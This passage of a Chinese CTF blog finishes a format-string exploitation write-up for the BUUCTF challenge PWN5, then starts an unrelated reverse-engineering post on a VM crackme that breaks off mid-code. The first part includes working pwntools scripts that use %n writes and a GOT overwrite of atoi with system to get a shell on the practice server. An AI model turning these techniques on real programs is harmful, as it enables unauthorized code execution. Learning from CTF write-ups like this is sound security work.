href="https://blog.csdn.net/u014377094/article/details/124902890?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165941639716782425169227%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165941639716782425169227&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_34-6-124902890-null-null.142%5Ev38%5Epc_rank_34&utm_term=pwn%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E&spm=1018.2226.3001.4187">参考文章：CSDN-Marx_ICB（作者）-【PWN】格式化字符串漏洞原理</a>如下内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%hhn 写一字节</span><br><span class="line">%hn  写两字节</span><br><span class="line">%n   写四字节</span><br><span class="line">%ln  32位写四字节，64位写八字节</span><br><span class="line">%lln 写八字节</span><br></pre></td></tr></table></figure>

<p>（ps：关于<code>&quot;-&quot;</code>的输出问题（我自己在做题时的困惑），为什么<code>&quot;-&quot;</code>不影响输出结果如<code>&quot;0x41414141&quot;</code>的相对位置，因为，<code>%p</code>打印的是从<code>printf</code>参数的起始位置（本题中为<code>0xffffd010</code>，该位置偏移量为0）的下一个位置开始（偏移量为1），第一个<code>%p</code>的输出内容为<code>0xffffd014</code>的内容，此时还没有开始输出到存储字符串本身内容的位置，而<code>printf</code>在输出打印内容时是按顺序打印结果，例如先输出<code>AAAA</code>，在输出<code>&quot;-&quot;</code>,遇到<code>%p</code>了，输出其对应偏移量（相对于<code>printf</code>参数）位置的内容，而<code>&quot;-&quot;</code>对应的16进制数就是<code>2d</code>，所以会看到从第十一个参数开始出现<code>2d</code>）</p>
<h3 id="（二）方法二"><a href="#（二）方法二" class="headerlink" title="（二）方法二"></a>（二）方法二</h3><p>修改exp.py的内容：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;DEBUG&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_sym = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;atoi_got:&quot;</span>,<span class="built_in">hex</span>(atoi_got))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system_sym:&quot;</span>,<span class="built_in">hex</span>(system_sym))</span><br></pre></td></tr></table></figure>

<p>结果如下图：<br><img src="/59b86d353e5cc2feffe9e6e720714283.png" alt="enter description here"><br>发现如果用方法一精心地构造<code>payload</code>，会非常困难比如把<code>atoi_got</code>中的最后一字节0x34改成目的数值（0x80)相当困难，因为buf可写入长度仅为0x70个字节，当然也可以进一步想办法解决该问题，但是本文在此处决定使用<code>pwntools</code>自带的<code>fmtstr_payload</code>函数，以期同时掌握更多工具使用方法。构造的<code>payload</code>如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;atoi_got:system_sym&#125;)</span><br></pre></td></tr></table></figure>

<p>第一个参数为第二个参数第一部分（即<code>atoi_got</code>）到<code>printf</code>的参数的偏移量，第二个参数的第一部分为要篡改的地址，第二个部分为要篡改之后的值。<br>(这里有个很奇怪的地方，就是当将<code>elf.sym[&#39;system&#39;]</code>改为<code>elf.plt[&#39;system&#39;]</code>时，仍然可以攻击成功，改成<code>elf.got[&#39;system&#39;]</code>后，攻击失败，这里我不太理解，应该是对plt、got的理解不够，之后尽快补上)</p>
<h3 id="三-其他：pwngdb中fmtarg和pwntools中FmtStr类"><a href="#三-其他：pwngdb中fmtarg和pwntools中FmtStr类" class="headerlink" title="(三)其他：pwngdb中fmtarg和pwntools中FmtStr类"></a>(三)其他：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/525576998">pwngdb中fmtarg</a>和<a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/115061803">pwntools中FmtStr类</a></h3><h4 id="1-pwngdb中fmtarg"><a href="#1-pwngdb中fmtarg" class="headerlink" title="1.pwngdb中fmtarg"></a>1.<code>pwngdb</code>中<code>fmtarg</code></h4><p><img src="/4865bdd57ca3b46688d75d65597256d7.png" alt="enter description here"><br>参见参考文章四。<br><code>fmtarg</code>使用及<code>pwngdb</code>、<code>pwndbg</code>的配置参见下面链接的文章。（如果输入<code>fmtarg</code>报错说没有该命令，则需要按下面文章进行配置）<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43092232/article/details/105648769">参考文章八：CSDN-n19hT（作者）-gdb调试 | pwndbg+pwndbg联合使用</a><br>2.<code>pwntools</code>中<code>FmtStr</code>类<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/115061803">参考文章三：CSDN-lifanxin(作者)-CTF pwn题之格式化字符串漏洞详解</a></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exec_fmt</span>(<span class="params">pad</span>):</span><br><span class="line">    p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">    <span class="comment"># send 还是 sendline以程序为准</span></span><br><span class="line">    p.send(pad)</span><br><span class="line">    <span class="keyword">return</span> p.recv()</span><br><span class="line"></span><br><span class="line">fmt = FmtStr(exec_fmt)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;offset ===&gt; &quot;</span>, fmt.offset)</span><br></pre></td></tr></table></figure>

<p>输出结果如下。<br><img src="/583378d9fc901567368737081e1cb2c5.png" alt="enter description here"><br>这里有我不理解的两个点，一个是<code>fmt = FmtStr(exec_fmt)</code>这里，没有给<code>exec_fmt</code>传入任何参数（应该是py基础不好)，另一个是还是没有理解<code>FmtStr</code>类的细节，这个需要继续学习。</p>
<h2 id="三、攻击脚本"><a href="#三、攻击脚本" class="headerlink" title="三、攻击脚本"></a>三、攻击脚本</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41696518/article/details/125771666">payload1参考博文：CSDN-Mokapeng（作者）-[第五空间2019 决赛]PWN5 ——两种解法</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41560595/article/details/114916869">payload2参考博文：云啾啾啾（作者）-buuctf——[第五空间2019 决赛]PWN5 1</a></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;DEBUG&quot;</span></span><br><span class="line">ifRemote = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> ifRemote:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29457</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line"></span><br><span class="line">passwd = <span class="number">0x804C044</span></span><br><span class="line">payload1 = p32(passwd) + p32(passwd+<span class="number">1</span>) + p32(passwd+<span class="number">2</span>) + p32(passwd+<span class="number">3</span>) + <span class="string">b&quot;%10$n%11$n%12$n%13$n&quot;</span></span><br><span class="line"><span class="comment">#payload2=b&quot;AAAA%16$n%17$n%18$n%19$n&quot;+p32(bss)+p32(bss+1)+p32(bss+2)+p32(bss+3)#（在此处这个形式的payload就是）就是想说明%16$n这样的格式化参数也要算做一个偏移量，64位由于0截断的原因，需要采取第二种payload的格式</span></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>额外的解释：</p>
<p><code>%10$n</code>向<code>passwd</code>(<code>0x804C044</code>地址)写入了<code>4*（len(p32(passwd))）</code>长度（<code>printf</code>(<code>payload1</code>)已输出字符串的长度）对应的数字：<code>16</code>（即<code>0x10</code>）（<code>p32</code>长度为4字节），同理<code>%11$n</code>向<code>passwd+1</code>(<code>0x804C045</code>地址)处写入<code>0x10</code>（<code>%10$n</code>这样的占位符不会影响<code>printf</code>的输出内容的长度）(更高位被覆盖为0了，不用理)，所以执行完<code>sendline（payload1）</code>以后，从<code>0x804C044</code>开始的4个字节内容为<code>0x10101010</code>(即<code>passwd</code>变量的内容)，此时继续执行<code>sendline(str(&#39;0x10101010&#39;))</code>，源程序里通过<code>atoi</code>将输入转为<code>0x10101010</code>（看反汇编代码的main函数）,此时转为数字后的输入就与<code>0x804C044</code>的<code>passwd</code>的内容<code>0x10101010</code>一致了，执行<code>system(&#39;/bin/sh&#39;)</code>就getshell了</p>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;DEBUG&quot;</span></span><br><span class="line">ifRemote = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> ifRemote:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25450</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_sym = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;atoi_got:&quot;</span>,<span class="built_in">hex</span>(atoi_got))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system_sym:&quot;</span>,<span class="built_in">hex</span>(system_sym))</span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;atoi_got:system_sym&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="四、遇到的问题"><a href="#四、遇到的问题" class="headerlink" title="四、遇到的问题"></a>四、遇到的问题</h2><h3 id="（一）懒得尝试，希望于“吃别人做好的饭”"><a href="#（一）懒得尝试，希望于“吃别人做好的饭”" class="headerlink" title="（一）懒得尝试，希望于“吃别人做好的饭”"></a>（一）懒得尝试，希望于“吃别人做好的饭”</h3><p>一开始对payload的构造不能理解，网上的博文大多讲的不清楚，或者说不对我的“胃口”，感觉自己关注的地方，网上的博文并没能为我解答，只有自己调试了。<br>比如网上有些地方讲的%p的偏移量是对于esp来讲的，哪一步的esp？有些博文并没有说。<br>拿<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41560595/article/details/114916869">博文：云啾啾啾（作者）-buuctf——[第五空间2019 决赛]PWN5 1</a>举个例子，博文中说到：<code>“在用户输入用户名处，先输入一个AAAA，试探会写在栈的哪个位置。”</code>和<code>&quot;AAAA%16$n%17$n%18$n%19$n&quot;这一段一共是24个字节，当写入栈里时，会占满第10，11，12，13，14，15个位置；</code>，为什么用“试探”这个词，到底为什么在这样一个位置？写入栈里的第几个位置，可是栈不是在增长或减少吗？这个位置是固定的吗？相对于谁呢？在什么时候的相对位置呢？也许是博主已经对这种基本知识的掌握很扎实，并未深入讲解，然而我不能理解，于是本篇文章重点对我不理解的地方做了调试与深入探究。</p>
<h3 id="（二）还是没有理解FmtStr类的细节。"><a href="#（二）还是没有理解FmtStr类的细节。" class="headerlink" title="（二）还是没有理解FmtStr类的细节。"></a>（二）还是没有理解<code>FmtStr</code>类的细节。</h3><h3 id="（三）对plt，got表的相关内容理解不深，浮于表面。"><a href="#（三）对plt，got表的相关内容理解不深，浮于表面。" class="headerlink" title="（三）对plt，got表的相关内容理解不深，浮于表面。"></a>（三）对<code>plt</code>，<code>got</code>表的相关内容理解不深，浮于表面。</h3><h2 id="五、总结反思"><a href="#五、总结反思" class="headerlink" title="五、总结反思"></a>五、总结反思</h2><p>这次做题沉下心了仔细审题代码并且不懂的地方一步一步调试，采取一种绝不向不会的地方妥协的策略，发现很多问题都不是很难解决。而且还是要对不懂得知识做深入的研究，本文待进一步修改。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/12/28/printf/" data-id="cuidRqgp5TZrTJhA-y5AnmOp8" data-title="格式化字符串" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-S1mpleVM" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/11/17/S1mpleVM/" class="article-date">
  <time class="dt-published" datetime="2024-11-17T14:05:32.000Z" itemprop="datePublished">2024-11-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/11/17/S1mpleVM/">S1mpleVM</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="S1mpleVM"><a href="#S1mpleVM" class="headerlink" title="S1mpleVM"></a>S1mpleVM</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ( (unsigned int)sub_140001D30(v30, v8) )</span><br><span class="line">&#123;</span><br><span class="line">  sub_1400011B0(&quot;Ultimate secret box is not only the name muahahaha&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以找到最关键的函数 <code>sub_140001D30</code> 就是 VM 入口</p>
<p>查看这个函数有很明显的 vm_handler</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall vmrun(char *input, char *vmcode)</span><br><span class="line">&#123;</span><br><span class="line">  //some defs for local variable</span><br><span class="line">  v2 = 0LL;</span><br><span class="line">  v3 = *vmcode - 16;</span><br><span class="line">  v5 = v48;</span><br><span class="line">  v6 = vmcode + 1;</span><br><span class="line">  while ( 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    switch ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 0u:</span><br><span class="line">        if ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v9 = v2;</span><br><span class="line">          v2 = (signed int *)*((_QWORD *)v2 + 1);</span><br><span class="line">          v7 = *v9;</span><br><span class="line">          free(v9);</span><br><span class="line">          if ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v10 = v2;</span><br><span class="line">            v2 = (signed int *)*((_QWORD *)v2 + 1);</span><br><span class="line">            v8 = *v10;</span><br><span class="line">            free(v10);</span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">            v8 = 0x80000000;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = 0x80000000;</span><br><span class="line">          v8 = 0x80000000;</span><br><span class="line">        &#125;</span><br><span class="line">        v11 = (signed int *)j__malloc_base(0x10uLL);</span><br><span class="line">        *v11 = v7 % v8;</span><br><span class="line">        goto LABEL_53;</span><br><span class="line">      case 1u:</span><br><span class="line">        //...</span><br><span class="line">LABEL_53:</span><br><span class="line">      *((_QWORD *)v11 + 1) = v2;</span><br><span class="line">      v2 = v11;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>恢复结构体之后这个 vm 还是很一目了然的，下面解释一下各个 opcode 的作用。</p>
<ul>
<li>0：取模操作（先弹出的值在运算符左侧）</li>
<li>1：push 操作</li>
<li>2：pop 操作</li>
<li>3：乘法操作</li>
<li>4：加法操作</li>
<li>5：输出</li>
<li>6：取输入指针</li>
<li>7：右移位后取最低位（先弹出的值在运算符右侧）</li>
<li>8：异或操作</li>
<li>9：输入指针+1</li>
<li>10：返回</li>
<li>11：减法操作（先弹出的值在运算符左侧）</li>
<li>12：除法操作（先弹出的值在运算符左侧）</li>
</ul>
<p>运行根据程序写的cpp文件，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">g++ test.cpp -o test</span><br><span class="line">./test</span><br><span class="line">./test &gt; output.txt</span><br></pre></td></tr></table></figure>

<p>节选一段log：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 0</span><br><span class="line">calc (102&gt;&gt;0)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 2</span><br><span class="line">calc 2*0=0</span><br><span class="line">push val 0</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 1</span><br><span class="line">calc (102&gt;&gt;1)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 3</span><br><span class="line">calc 3*1=3</span><br><span class="line">push val 3</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 2</span><br><span class="line">calc (102&gt;&gt;2)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 67</span><br><span class="line">calc 67*1=67</span><br><span class="line">push val 67</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 3</span><br><span class="line">calc (102&gt;&gt;3)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 37</span><br><span class="line">calc 37*0=0</span><br><span class="line">push val 0</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 4</span><br><span class="line">calc (102&gt;&gt;4)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 41</span><br><span class="line">calc 41*0=0</span><br><span class="line">push val 0</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 5</span><br><span class="line">calc (102&gt;&gt;5)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 11</span><br><span class="line">calc 11*1=11</span><br><span class="line">push val 11</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 6</span><br><span class="line">calc (102&gt;&gt;6)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 13</span><br><span class="line">calc 13*1=13</span><br><span class="line">push val 13</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 7</span><br><span class="line">calc (102&gt;&gt;7)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 89</span><br><span class="line">calc 89*0=0</span><br><span class="line">push val 0</span><br><span class="line">calc 0+13=13</span><br><span class="line">push val 13</span><br><span class="line">calc 13+11=24</span><br><span class="line">push val 24</span><br><span class="line">calc 24+0=24</span><br><span class="line">push val 24</span><br><span class="line">calc 24+0=24</span><br><span class="line">push val 24</span><br><span class="line">calc 24+67=91</span><br><span class="line">push val 91</span><br><span class="line">calc 91+3=94</span><br><span class="line">push val 94</span><br><span class="line">calc 94+0=94</span><br><span class="line">push val 94</span><br><span class="line">push val 70</span><br><span class="line">calc 70^94=24</span><br><span class="line">push val 24</span><br><span class="line">get 2 input</span><br><span class="line">push val 108</span><br><span class="line">push val 0</span><br><span class="line">calc (108&gt;&gt;0)&amp;1=0</span><br></pre></td></tr></table></figure>

<p>最前面输出了一句话：Thank for providing passcode, my ultimate secret box is checking…</p>
<p>跳过之后，发现它在频繁的取输入字符并做 <code>(x&gt;&gt;y)&amp;1</code> 的运算，y 从 <code>0~7</code>。这是在一个一个取出输入字节的每一位，每一位都对应了一个权值。第一个字节可以看出来，从低位到高位权值分别为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 3 67 37 41 11 13 89</span><br></pre></td></tr></table></figure>

<p>得到权值的方法：在 <code>*</code> 运算中加入 <code>fprintf(stderr,&quot;%d,&quot;,reg2);</code></p>
<p>最后，它将所有权值相加，得到的结果和 70 做异或运算得到 24，将该值存入栈底。</p>
<p>得到异或目标值：在异或的 opcode 中加入 <code>fprintf(stderr,&quot;%d,&quot;,reg2);</code></p>
<p>看log的最后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">calc 137+71=208</span><br><span class="line">push val 208</span><br><span class="line">calc 208+39=247</span><br><span class="line">push val 247</span><br><span class="line">calc 247+120=367</span><br><span class="line">push val 367</span><br><span class="line">calc 367+22=389</span><br><span class="line">push val 389</span><br><span class="line">calc 389+119=508</span><br><span class="line">push val 508</span><br><span class="line">calc 508+89=597</span><br><span class="line">push val 597</span><br><span class="line">calc 597+22=619</span><br><span class="line">push val 619</span><br><span class="line">calc 619+218=837</span><br><span class="line">push val 837</span><br><span class="line">calc 837+203=1040</span><br><span class="line">push val 1040</span><br><span class="line">calc 1040+125=1165</span><br><span class="line">push val 1165</span><br><span class="line">calc 1165+125=1290</span><br><span class="line">push val 1290</span><br><span class="line">calc 1290+5=1295</span><br><span class="line">push val 1295</span><br><span class="line">calc 1295+118=1413</span><br><span class="line">push val 1413</span><br><span class="line">calc 1413+30=1443</span><br><span class="line">push val 1443</span><br><span class="line">calc 1443+59=1502</span><br><span class="line">push val 1502</span><br><span class="line">calc 1502+89=1591</span><br><span class="line">push val 1591</span><br><span class="line">calc 1591+213=1804</span><br><span class="line">push val 1804</span><br><span class="line">calc 1804+114=1918</span><br><span class="line">push val 1918</span><br><span class="line">calc 1918+35=1953</span><br><span class="line">push val 1953</span><br><span class="line">calc 1953+18=1971</span><br><span class="line">push val 1971</span><br><span class="line">calc 1971+18=1989</span><br><span class="line">push val 1989</span><br><span class="line">calc 1989+121=2110</span><br><span class="line">push val 2110</span><br><span class="line">calc 2110+65=2175</span><br><span class="line">push val 2175</span><br><span class="line">calc 2175+32=2207</span><br><span class="line">push val 2207</span><br><span class="line">calc 2207+221=2428</span><br><span class="line">push val 2428</span><br><span class="line">calc 2428+253=2681</span><br><span class="line">push val 2681</span><br><span class="line">calc 2681+348=3029</span><br><span class="line">push val 3029</span><br><span class="line">calc 3029+130=3159</span><br><span class="line">push val 3159</span><br><span class="line">calc 3159+92=3251</span><br><span class="line">push val 3251</span><br><span class="line">calc 3251+140=3391</span><br><span class="line">push val 3391</span><br><span class="line">calc 3391+24=3415</span><br><span class="line">push val 3415</span><br><span class="line">pop 3415 to reg1</span><br><span class="line">retval=3415</span><br></pre></td></tr></table></figure>

<p>计算的第一个异或值，在最后被加起来返回了。</p>
<p>最终根据逻辑，写出还原 passcode 的逻辑。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">char v[]=&#123;</span><br><span 